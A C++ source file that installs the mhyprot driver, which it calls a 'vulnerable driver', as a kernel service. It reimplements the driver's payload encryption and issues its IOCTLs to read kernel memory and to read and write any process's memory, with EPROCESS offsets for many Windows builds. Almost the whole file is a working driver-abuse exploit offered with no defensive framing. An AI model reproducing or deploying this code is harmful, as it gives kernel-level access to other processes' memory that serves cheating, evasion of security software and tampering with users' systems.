#include <stdio.h>
#include "Driver.hpp"
uint64_t process_id;
uint64_t systembase = 0;
uint64_t EPImageFileName = 0;
uint64_t EPUniqueProcessId = 0;
uint64_t EPSectionBaseAddress = 0;
uint64_t EPActiveProcessLinks = 0;

bool ReadVirtual(uint64_t dirbase, uint64_t address, uint8_t* buffer, int size)
{
	auto paddress = address;
	return mhyprot::driver_impl::read_kernel_memory(paddress, buffer, size);
}

uint64_t SFGetEProcess(int pid)
{
	auto handle_info = QueryInfo<SYSTEM_HANDLE_INFORMATION>(SystemHandleInformation);
	if(!handle_info.get())
		return 0;

	for(size_t i = 0; i < handle_info->HandleCount; i++)
		if(pid == handle_info->Handles[i].ProcessId && 7 == handle_info->Handles[i].ObjectTypeNumber) {
			////logger::log2("[+] Got Handle is 0x%llX\n", reinterpret_cast<size_t>(handle_info->Handles[i].Object));
			return reinterpret_cast<size_t>(handle_info->Handles[i].Object);
		}
	return 0;
}

uint64_t GetEProcess(int pid)
{
	_LIST_ENTRY ActiveProcessLinks;

	ReadVirtual(systembase, SFGetEProcess(4) + EPActiveProcessLinks, (uint8_t*)&ActiveProcessLinks, sizeof(ActiveProcessLinks));

	while(true)
	{
		uint64_t next_pid = 0;
		char buffer[0xFFFF];
		uint64_t next_link = (uint64_t)(ActiveProcessLinks.Flink);
		uint64_t next = next_link - EPActiveProcessLinks;
		ReadVirtual(systembase, next + EPUniqueProcessId, (uint8_t*)&next_pid, sizeof(next_pid));
		ReadVirtual(systembase, next + EPImageFileName, (uint8_t*)&buffer, sizeof(buffer));
		ReadVirtual(systembase, next + EPActiveProcessLinks, (uint8_t*)&ActiveProcessLinks, sizeof(ActiveProcessLinks));
		if(GetAsyncKeyState(VK_MENU)) {
			mhyprot::unload();
		}

		if(next_pid == pid) {
			return next;
		}
		if(next_pid == 4 || next_pid == 0)
			break;
	}
	return 0;
}

uint64_t GetKernelModuleAddress(const std::string& module_name)
{
	void* buffer = nullptr;
	DWORD buffer_size = 0;

	NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(SystemModuleInformation), buffer, buffer_size, &buffer_size);

	while(status == STATUS_INFO_LENGTH_MISMATCH)
	{
		VirtualFree(buffer, 0, MEM_RELEASE);

		buffer = VirtualAlloc(nullptr, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(SystemModuleInformation), buffer, buffer_size, &buffer_size);
	}

	if(!NT_SUCCESS(status))
	{
		VirtualFree(buffer, 0, MEM_RELEASE);
		return 0;
	}

	const auto modules = static_cast<PRTL_PROCESS_MODULES>(buffer);

	for(auto i = 0u; i < modules->NumberOfModules; ++i)
	{
		const std::string current_module_name = std::string(reinterpret_cast<char*>(modules->Modules[i].FullPathName) + modules->Modules[i].OffsetToFileName);

		if(!_stricmp(current_module_name.c_str(), module_name.c_str()))
		{
			const uint64_t result = reinterpret_cast<uint64_t>(modules->Modules[i].ImageBase);

			VirtualFree(buffer, 0, MEM_RELEASE);
			return result;
		}
	}

	VirtualFree(buffer, 0, MEM_RELEASE);
	return 0;
}

void FixOffsets() {

	using namespace std;

	NTSTATUS(WINAPI * RtlGetVersion)(LPOSVERSIONINFOEXW);
	OSVERSIONINFOEXW osInfo;

	*(FARPROC*)&RtlGetVersion = GetProcAddress(GetModuleHandleA("ntdll"),
		"RtlGetVersion");

	DWORD build = 0;

	if(NULL != RtlGetVersion)
	{
		osInfo.dwOSVersionInfoSize = sizeof(osInfo);
		RtlGetVersion(&osInfo);
		build = osInfo.dwBuildNumber;
	}

	//https://www.vergiliusproject.com/kernels/x64/Windows%2010%20|%202016/2009%2020H2%20(October%202020%20Update)/_EPROCESS
	switch(build) // some offsets might be wrong, check it yourself it if does not work
	{
	case 22000: //WIN11
		EPImageFileName = 0x5a8;
		EPUniqueProcessId = 0x440;
		EPSectionBaseAddress = 0x520;
		EPActiveProcessLinks = 0x448;
		break;
	case 19044: //WIN10_21H2
		EPImageFileName = 0x5a8;
		EPUniqueProcessId = 0x440;
		EPSectionBaseAddress = 0x520;
		EPActiveProcessLinks = 0x448;
		break;
	case 19043: //WIN10_21H1
		EPImageFileName = 0x5a8;
		EPUniqueProcessId = 0x440;
		EPSectionBaseAddress = 0x520;
		EPActiveProcessLinks = 0x448;
		break;
	case 19042: //WIN10_20H2
		EPImageFileName = 0x5a8;
		EPUniqueProcessId = 0x440;
		EPSectionBaseAddress = 0x520;
		EPActiveProcessLinks = 0x448;
		break;
	case 19041: //WIN10_20H1
		EPImageFileName = 0x5a8;
		EPUniqueProcessId = 0x440;
		EPSectionBaseAddress = 0x520;
		EPActiveProcessLinks = 0x448;
		break;
	case 18363: //WIN10_19H2
		EPImageFileName = 0x450;
		EPUniqueProcessId = 0x2e8;
		EPSectionBaseAddress = 0x3c8;
		EPActiveProcessLinks = 0x2f0;
		break;
	case 18362: //WIN10_19H1
		EPImageFileName = 0x450;
		EPUniqueProcessId = 0x2e8;
		EPSectionBaseAddress = 0x3c8;
		EPActiveProcessLinks = 0x2f0;
		break;
	case 17763: //WIN10_RS5
		EPImageFileName = 0x450;
		EPUniqueProcessId = 0x2e0;
		EPSectionBaseAddress = 0x3c0;
		EPActiveProcessLinks = 0x2e8;
		break;
	case 17134: //WIN10_RS4
		EPImageFileName = 0x450;
		EPUniqueProcessId = 0x2e0;
		EPSectionBaseAddress = 0x3c0;
		EPActiveProcessLinks = 0x2e8;
		break;
	case 16299: //WIN10_RS3
		EPImageFileName = 0x450;
		EPUniqueProcessId = 0x2e0;
		EPSectionBaseAddress = 0x3c0;
		EPActiveProcessLinks = 0x2e8;
		break;
	case 15063: //WIN10_RS2
		EPImageFileName = 0x450;
		EPUniqueProcessId = 0x2e0;
		EPSectionBaseAddress = 0x3c0;
		EPActiveProcessLinks = 0x2e8;
		break;
	case 14393: //WIN10_RS1
		EPImageFileName = 0x450;
		EPUniqueProcessId = 0x2e8;
		EPSectionBaseAddress = 0x3c0;
		EPActiveProcessLinks = 0x2f0;
		break;
	case 10586: //WIN10_TH2
		EPImageFileName = 0x450;
		EPUniqueProcessId = 0x2e8;
		EPSectionBaseAddress = 0x3c0;
		EPActiveProcessLinks = 0x2f0;
		break;
	default:
		//printf("[!] No Support for %d,\n check https://www.vergiliusproject.com/kernels/x64/Windows%2011/Insider%20Preview%20(Jun%202021)/_EPROCESS to update the code\n", build);
		exit(0);
		break;
	}
	//printf("[+] Found offsets for %d!\n", build);
}

uint64_t GetProcessId() {
	return process_id;
}

uint64_t GetProcessBase(int pid) {
	FixOffsets();

	if(systembase == 0) {
		systembase = GetKernelModuleAddress("ntoskrnl.exe");
	}
	uint64_t base = 0;
	//logger::log2("[+] Got System Base is 0x%llX\n", systembase);
	ReadVirtual(systembase, GetEProcess(pid) + EPSectionBaseAddress, (uint8_t*)&base, sizeof(base));
	//logger::log2("[+] Got Process Base is 0x%llX\n", base);
	process_id = pid;
	return base;
}

uint64_t GetProcessId(const char* process_name) {
	UINT pid = 0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process;
	ZeroMemory(&process, sizeof(process));
	process.dwSize = sizeof(process);
	if(Process32First(snapshot, &process))
	{
		do
		{
			if(std::strcmp(process.szExeFile, process_name) == 0)
			{
				//printf("PID::: %d : [%s] , %s\n\n", process.th32ProcessID, process.szExeFile, process_name);
				pid = process.th32ProcessID;
				break;
			}
		} while(Process32Next(snapshot, &process));
	}
	CloseHandle(snapshot);
	return pid;
}

bool read_raw(int pid, uint64_t address, void* buffer, size_t size) {
	return mhyprot::driver_impl::read_user_memory(pid, address, buffer, size);
}

bool write_raw(int pid, uint64_t address, void* buffer, size_t size) {
	return mhyprot::driver_impl::write_user_memory(pid, address, buffer, size);
}
// create file from memory
bool file_utils::create_file_from_buffer(
	const std::string_view file_path, void* buffer, size_t size
)
{
	std::ofstream stream(
		file_path.data(),
		std::ios_base::out | std::ios_base::binary
	);

	if (!stream.write((char*)buffer, size))
	{
		stream.close();
		return false;
	}

	stream.close();
	return true;
}
BOOL is_main_window(HWND handle)
{
	return GetWindow(handle, GW_OWNER) == (HWND)0 && IsWindowVisible(handle);
}

BOOL CALLBACK enum_windows_callback(HWND handle, LPARAM lParam)
{
	handle_data& data = *(handle_data*)lParam;
	unsigned long process_id = 0;
	GetWindowThreadProcessId(handle, &process_id);
	if (data.process_id != process_id || !is_main_window(handle))
		return TRUE;
	data.window_handle = handle;
	return FALSE;
}
HWND  Utils::FindMainWindow(DWORD process_id)
{
	handle_data data;
	data.process_id = process_id;
	data.window_handle = 0;
	EnumWindows(enum_windows_callback, (LPARAM)&data);
	return data.window_handle;
}

//DWORD Utils::GetBase(DWORD PID, const std::wstring& modulename)
//{
//	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, PID);
//	DWORD dwModuleBaseAddress = 0;
//	if (hSnapshot != INVALID_HANDLE_VALUE)
//	{
//		MODULEENTRY32 ModuleEntry32 = { 0 };
//		ModuleEntry32.dwSize = sizeof(MODULEENTRY32);
//		if (Module32First(hSnapshot, &ModuleEntry32))
//		{
//			do
//			{
//				if (!modulename.compare(ModuleEntry32.szModule))
//				{
//					dwModuleBaseAddress = (DWORD)ModuleEntry32.modBaseAddr;
//					break;
//				}
//			} while (Module32Next(hSnapshot, &ModuleEntry32));
//		}
//		CloseHandle(hSnapshot);
//	}
//	return dwModuleBaseAddress;
//}

//DWORD Utils::GetPID(const std::wstring& procname)
//{
//	PROCESSENTRY32 processInfo;
//	processInfo.dwSize = sizeof(processInfo);
//
//	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
//	if (processesSnapshot == INVALID_HANDLE_VALUE) {
//		return 0;
//	}
//
//	Process32First(processesSnapshot, &processInfo);
//	if (!procname.compare(processInfo.szExeFile))
//	{
//		CloseHandle(processesSnapshot);
//		return processInfo.th32ProcessID;
//	}
//
//	while (Process32Next(processesSnapshot, &processInfo))
//	{
//		if (!procname.compare(processInfo.szExeFile))
//		{
//			CloseHandle(processesSnapshot);
//			return processInfo.th32ProcessID;
//		}
//	}
//
//	CloseHandle(processesSnapshot);
//	return 0;
//}

// find the process id by specific name using ToolHelp32Snapshot
uint32_t win_utils::find_process_id(const std::string_view process_name)
{
	PROCESSENTRY32 processentry = {};

	const unique_handle snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0), &CloseHandle);

	if (!CHECK_HANDLE(snapshot.get()))
	{
		//logger::log2("[!] Failed to create ToolHelp32Snapshot [0x%lX]\n", GetLastError());
		return 0;
	}

	processentry.dwSize = sizeof(MODULEENTRY32);

	while (Process32Next(snapshot.get(), &processentry) == TRUE)
	{
		if (process_name.compare(processentry.szExeFile) == 0)
		{
			return processentry.th32ProcessID;
		}
	}

	return 0;
}

//
// find the base address of process by the pid using ToolHelp32Snapshot
//
uint64_t win_utils::find_base_address(const uint32_t process_id)
{
	MODULEENTRY32 module_entry = {};

	const unique_handle snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, process_id), &CloseHandle);

	if (!CHECK_HANDLE(snapshot.get()))
	{
		//printf("[!] Failed to create ToolHelp32Snapshot [0x%lX]\n", GetLastError());
		return 0;
	}

	module_entry.dwSize = sizeof(module_entry);

	Module32First(snapshot.get(), &module_entry);

	return (uint64_t)module_entry.modBaseAddr;
}

//
// lookup base address of specific module that loaded in the system
// by NtQuerySystemInformation api
//
uint64_t win_utils::obtain_sysmodule_address(
	const std::string_view target_module_name,
	bool debug_prints
)
{
	const HMODULE module_handle = GetModuleHandle(TEXT("ntdll.dll"));

	if (!CHECK_HANDLE(module_handle))
	{
		//logger::log2("[!] failed to obtain ntdll.dll handle. (0x%lX)\n", module_handle);
		return 0;
	}

	pNtQuerySystemInformation NtQuerySystemInformation =
		(pNtQuerySystemInformation)GetProcAddress(module_handle, "NtQuerySystemInformation");

	if (!NtQuerySystemInformation)
	{
		//logger::log2("[!] failed to locate NtQuerySystemInformation. (0x%lX)\n", GetLastError());
		return 0;
	}

	NTSTATUS status;
	PVOID buffer;
	ULONG alloc_size = 0x10000;
	ULONG needed_size;

	do
	{
		buffer = calloc(1, alloc_size);

		if (!buffer)
		{
			//logger::log2("[!] failed to allocate buffer for query (0). (0x%lX)\n", GetLastError());
			return 0;
		}

		status = NtQuerySystemInformation(
			SystemModuleInformation,
			buffer,
			alloc_size,
			&needed_size
		);

		if (!NT_SUCCESS(status) && status != STATUS_INFO_LENGTH_MISMATCH)
		{
			//logger::log2("[!] failed to query system module information. NTSTATUS: 0x%llX\n", status);
			free(buffer);
			return 0;
		}

		if (status == STATUS_INFO_LENGTH_MISMATCH)
		{
			free(buffer);
			buffer = NULL;
			alloc_size *= 2;
		}
	} while (status == STATUS_INFO_LENGTH_MISMATCH);

	if (!buffer)
	{
		//logger::log2("[!] failed to allocate buffer for query (1). (0x%lX)\n", GetLastError());
		return 0;
	}

	PSYSTEM_MODULE_INFORMATION module_information = (PSYSTEM_MODULE_INFORMATION)buffer;

	//logger::log2("[>] looking for %s in sysmodules...\n", target_module_name.data());

	for (ULONG i = 0; i < module_information->Count; i++)
	{
		SYSTEM_MODULE_INFORMATION_ENTRY module_entry = module_information->Module[i];
		ULONG_PTR module_address = (ULONG_PTR)module_entry.DllBase;

		if (module_address < MIN_ADDRESS)
		{
			continue;
		}

		PCHAR module_name = module_entry.ImageName + module_entry.ModuleNameOffset;

		if (debug_prints)
		{
			//logger::log2("[+] sysmodule: %025s @ 0x%llX\n", module_name, module_address);
		}

		if (target_module_name.compare(module_name) == 0 ||
			std::string(module_name).find("tinyman0200") != std::string::npos)
		{
			//logger::log2("[<] found\n");
			return module_address;
		}
	}

	free(buffer);
	return 0;
}

// open service control manager to operate services
SC_HANDLE service_utils::open_sc_manager()
{
	return OpenSCManager(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
}

//
// create a new service
// sc create myservice binPath="" type=kernel
//
SC_HANDLE service_utils::create_service(const std::string_view driver_path)
{
	SC_HANDLE sc_manager_handle = open_sc_manager();

	CHECK_SC_MANAGER_HANDLE(sc_manager_handle, (SC_HANDLE)INVALID_HANDLE_VALUE);

	SC_HANDLE mhyprot_service_handle = CreateService(
		sc_manager_handle,
		MHYPROT_SERVICE_NAME,
		MHYPROT_DISPLAY_NAME,
		SERVICE_START | SERVICE_STOP | DELETE,
		SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
		driver_path.data(), nullptr, nullptr, nullptr, nullptr, nullptr
	);

	if (!CHECK_HANDLE(mhyprot_service_handle))
	{
		const auto last_error = GetLastError();

		if (last_error == ERROR_SERVICE_EXISTS)
		{
			//logger::log2("[+] the service already exists, open handle\n");

			return OpenService(
				sc_manager_handle,
				MHYPROT_SERVICE_NAME,
				SERVICE_START | SERVICE_STOP | DELETE
			);
		}

		//logger::log2("[!] failed to create %s service. (0x%lX)\n", MHYPROT_SERVICE_NAME, GetLastError());
		CloseServiceHandle(sc_manager_handle);
		return (SC_HANDLE)(INVALID_HANDLE_VALUE);
	}

	CloseServiceHandle(sc_manager_handle);

	return mhyprot_service_handle;
}

//
// delete the service
// sc delete myservice
//
bool service_utils::delete_service(SC_HANDLE service_handle, bool close_on_fail, bool close_on_success)
{
	SC_HANDLE sc_manager_handle = open_sc_manager();

	CHECK_SC_MANAGER_HANDLE(sc_manager_handle, false);

	if (!DeleteService(service_handle))
	{
		const auto last_error = GetLastError();

		if (last_error == ERROR_SERVICE_MARKED_FOR_DELETE)
		{
			CloseServiceHandle(sc_manager_handle);
			return true;
		}

		//logger::log2("[!] failed to delete the service. (0x%lX)\n", GetLastError());
		CloseServiceHandle(sc_manager_handle);
		if (close_on_fail) CloseServiceHandle(service_handle);
		return false;
	}

	CloseServiceHandle(sc_manager_handle);
	if (close_on_success) CloseServiceHandle(service_handle);

	return true;
}

//
// start the service
// sc start myservice
//
bool service_utils::start_service(SC_HANDLE service_handle)
{
	return StartService(service_handle, 0, nullptr);
}

//
// stop the service
// sc stop myservice
//
bool service_utils::stop_service(SC_HANDLE service_handle)
{
	SC_HANDLE sc_manager_handle = open_sc_manager();

	CHECK_SC_MANAGER_HANDLE(sc_manager_handle, false);

	SERVICE_STATUS service_status;

	if (!ControlService(service_handle, SERVICE_CONTROL_STOP, &service_status))
	{
		//logger::log2("[!] failed to stop the service. (0x%lX)\n", GetLastError());
		CloseServiceHandle(sc_manager_handle);
		return false;
	}

	CloseServiceHandle(sc_manager_handle);

	return true;
}
using namespace std;
 string getCurrentDirectoryOnWindows()
{
	const unsigned long maxDir = 260;
	char currentDir[maxDir];
	GetCurrentDirectory(maxDir, currentDir);
	return string(currentDir);
}
// initialization of its service and device
bool mhyprot::init()
{
    //logger::log2("[>] loading vulnerable driver...\n");

   /* char temp_path[MAX_PATH];
    const uint32_t length = GetTempPath(sizeof(temp_path), temp_path);

    if (length > MAX_PATH || !length)
    {
        //logger::log2("[!] failed to obtain temp path. (0x%lX)\n", GetLastError());
        return false;
    }

    //
    // place the driver binary into the temp path
    //
    const std::string placement_path = std::string(temp_path) + MHYPROT_SYSFILE_NAME;

    if (std::filesystem::exists(placement_path))
    {
        std::remove(placement_path.c_str());
    }*/
	//char temp_path[MAX_PATH];
	//const uint32_t length = GetTempPath(sizeof(temp_path), temp_path);
	TCHAR filename[_MAX_PATH];
	GetModuleFileName(NULL, filename, _MAX_PATH);
	//const std::string placement_path = std::string(filename);
	const std::string placement_path = std::string(MHYPROT_SYSFILE_NAME);
	const std::string placement_path2 = getCurrentDirectoryOnWindows() + "\\" + MHYPROT_SYSFILE_NAME;
	/*if (std::filesystem::exists(placement_path))
	{
		std::remove(placement_path.c_str());
	}*/
    //
    // create driver sys from memory
    //

    if (!file_utils::create_file_from_buffer(
		placement_path,//driver creation name
        (void*)resource::raw_driver,
        sizeof(resource::raw_driver)
    ))
    {
        //logger::log2("[!] failed to prepare %s. (0x%lX)\n", MHYPROT_SYSFILE_NAME, GetLastError());
        return false;
    }

    //logger::log2("[>] preparing service...\n");
    
    //
    // create service using winapi, this needs administrator privileage
    //
    //detail::mhyplot_service_handle = service_utils::create_service(placement_path); // driver service name
	detail::mhyplot_service_handle = service_utils::create_service(placement_path2); // driver service name

    if (!CHECK_HANDLE(detail::mhyplot_service_handle))
    {
        //logger::log2("[!] failed to create service. (0x%lX)\n", GetLastError());
        return false;
    }

    //
    // start the service
    //
    if (!service_utils::start_service(detail::mhyplot_service_handle))
    {
        //logger::log2("[!] failed to start service. (0x%lX)\n", GetLastError());
        return false;
    }

    //logger::log2("[<] %s prepared\n", MHYPROT_SYSFILE_NAME);

    //
    // open the handle of its driver device
    //
    detail::device_handle = CreateFile(
        TEXT(MHYPROT_DEVICE_NAME),
        GENERIC_READ | GENERIC_WRITE,
        0,
        nullptr,
        OPEN_EXISTING,
        NULL,
        NULL
    );

    if (!CHECK_HANDLE(detail::device_handle))
    {
        //logger::log2("[!] failed to obtain device handle (0x%lX)\n", GetLastError());
        return false;
    }

    //logger::log2("[+] device handle snatched (0x%llX)\n", detail::device_handle);

    //logger::log2("[>] mhyprot initialized successfully\n");

    return true;
}

void mhyprot::unload()
{
    if (detail::device_handle)
    {
        CloseHandle(detail::device_handle);
    }

    if (detail::mhyplot_service_handle)
    {
        service_utils::stop_service(detail::mhyplot_service_handle);
        service_utils::delete_service(detail::mhyplot_service_handle);
    }
}


bool mhyprot::driver_impl::request_ioctl(DWORD ioctl_code, LPVOID in_buffer, DWORD in_buffer_size)
{
    //
    // allocate memory for this command result
    //
    LPVOID out_buffer = calloc(1, in_buffer_size);
    DWORD out_buffer_size;

    if (!out_buffer)
    {
        return false;
    }
    
    //
    // send the ioctl request
    //
    const bool result = DeviceIoControl(
        mhyprot::detail::device_handle,
        ioctl_code,
        in_buffer,
        in_buffer_size,
        out_buffer,
        in_buffer_size,
        &out_buffer_size,
        NULL
    );

    //
    // store the result
    //
    if (out_buffer_size)
    {
        memcpy(in_buffer, out_buffer, out_buffer_size);
    }

    free(out_buffer);

    return result;
}

//
// initialize driver implementations with payload encryption requirements
//
bool mhyprot::driver_impl::driver_init(bool debug_prints, bool print_seeds)
{
    //logger::log2("[>] initializing driver...\n");

    //
    // the driver initializer
    //
    MHYPROT_INITIALIZE initializer;
    initializer._m_002 = 0x0BAEBAEEC;
    initializer._m_003 = 0x0EBBAAEF4FFF89042;

    if (!request_ioctl(MHYPROT_IOCTL_INITIALIZE, &initializer, sizeof(initializer)))
    {
        //logger::log2("[!] failed to initialize mhyplot driver implementation\n");
        return false;
    }

    //
    // driver's base address in the system
    //
    uint64_t mhyprot_address = win_utils::
        obtain_sysmodule_address(MHYPROT_SYSFILE_NAME, debug_prints);

    if (!mhyprot_address)
    {
        //logger::log2("[!] failed to locate mhyprot module address. (0x%lX)\n", GetLastError());
        return false;
    }

    //logger::log2("[+] %s is @ 0x%llX\n", MHYPROT_SYSFILE_NAME, mhyprot_address);

    //
    // read the pointer that points to the seedmap that used to encrypt payloads
    // the pointer on the [driver.sys + 0xA0E8]
    //
    uint64_t seedmap_address = driver_impl::
        read_kernel_memory<uint64_t>(mhyprot_address + MHYPROT_OFFSET_SEEDMAP);

    //logger::log2("[+] seedmap in kernel [0x%llX + 0x%lX] @ (seedmap)0x%llX\n",
      //  mhyprot_address, MHYPROT_OFFSET_SEEDMAP, seedmap_address);

    if (!seedmap_address)
    {
        //logger::log2("[!] failed to locate seedmap in kernel\n");
        return false;
    }

    //
    // read the entire seedmap as size of 0x9C0
    //
    if (!driver_impl::read_kernel_memory(
        seedmap_address,
        &detail::seedmap,
        sizeof(detail::seedmap)
    ))
    {
        //logger::log2("[!] failed to pickup seedmap from kernel\n");
        return false;
    }

    for (int i = 0; i < (sizeof(detail::seedmap) / sizeof(detail::seedmap[0])); i++)
    {
       // if (print_seeds)
            //logger::log2("[+] seedmap (%05d): 0x%llX\n", i, detail::seedmap[i]);
    }

    //logger::log2("[<] driver initialized successfully.\n"); 

    return true;
}

//
// generate a key for the payload
//
uint64_t mhyprot::driver_impl::generate_key(uint64_t seed)
{
    uint64_t k = ((((seed >> 29) & 0x555555555 ^ seed) & 0x38EB3FFFF6D3) << 17) ^ (seed >> 29) & 0x555555555 ^ seed;
    return ((k & 0xFFFFFFFFFFFFBF77u) << 37) ^ k ^ ((((k & 0xFFFFFFFFFFFFBF77u) << 37) ^ k) >> 43);
}

//
// encrypt the payload
//
void mhyprot::driver_impl::encrypt_payload(void* payload, size_t size)
{
    if (size % 8)
    {
        //logger::log2("[!] (payload) size must be 8-byte alignment");
        return;
    }

    if (size / 8 >= 312)
    {
        //logger::log2("[!] (payload) size must be < 0x9C0");
        return;
    }

    uint64_t* p_payload = (uint64_t*)payload;
    DWORD64 key_to_base = 0;

    for (DWORD i = 1; i < size / 8; i++)
    {
        const uint64_t key = driver_impl::generate_key(detail::seedmap[i - 1]);
        p_payload[i] = p_payload[i] ^ key ^ (key_to_base + p_payload[0]);
        key_to_base += 0x10;
    }
}

//
// read memory from the kernel using vulnerable ioctl
//
bool mhyprot::driver_impl::read_kernel_memory(uint64_t address, void* buffer, size_t size)
{
    if (!buffer)
    {
        return false;
    }

    DWORD payload_size = size + sizeof(DWORD);
    PMHYPROT_KERNEL_READ_REQUEST payload = (PMHYPROT_KERNEL_READ_REQUEST)calloc(1, payload_size);

    if (!payload)
    {
        return false;
    }

    payload->header.address = address;
    payload->size = size;

    if (!request_ioctl(MHYPROT_IOCTL_READ_KERNEL_MEMORY, payload, payload_size))
    {
        return false;
    }

    if (!payload->header.result)
    {
        memcpy(buffer, (PUCHAR)payload + 4, size);
        return true;
    }

    return false;
}

//
// read specific process memory from the kernel using vulnerable ioctl
// let the driver to execute MmCopyVirtualMemory
//
bool mhyprot::driver_impl::read_user_memory(
    uint32_t process_id, uint64_t address, void* buffer, size_t size
)
{
    MHYPROT_USER_READ_WRITE_REQUEST payload;
    payload.action = MHYPROT_ACTION_READ;   // action code
    payload.process_id = process_id;        // target process id
    payload.address = address;              // address
    payload.buffer = (uint64_t)buffer;      // our buffer
    payload.size = size;                    // size

    encrypt_payload(&payload, sizeof(payload));

    return request_ioctl(
        MHYPROT_IOCTL_READ_WRITE_USER_MEMORY,
        &payload,
        sizeof(payload)
    );
}

//
// write specific process memory from the kernel using vulnerable ioctl
// let the driver to execute MmCopyVirtualMemory
//
bool mhyprot::driver_impl::write_user_memory(
    uint32_t process_id, uint64_t address, void* buffer, size_t size
)
{
    MHYPROT_USER_READ_WRITE_REQUEST payload;
    payload.action = MHYPROT_ACTION_WRITE;  // action code
    payload.process_id = process_id;        // target process id
    payload.address = (uint64_t)buffer;     // our buffer
    payload.buffer = address;               // destination
    payload.size = size;                    // size

    encrypt_payload(&payload, sizeof(payload));

    return request_ioctl(
        MHYPROT_IOCTL_READ_WRITE_USER_MEMORY,
        &payload,
        sizeof(payload)
    );
}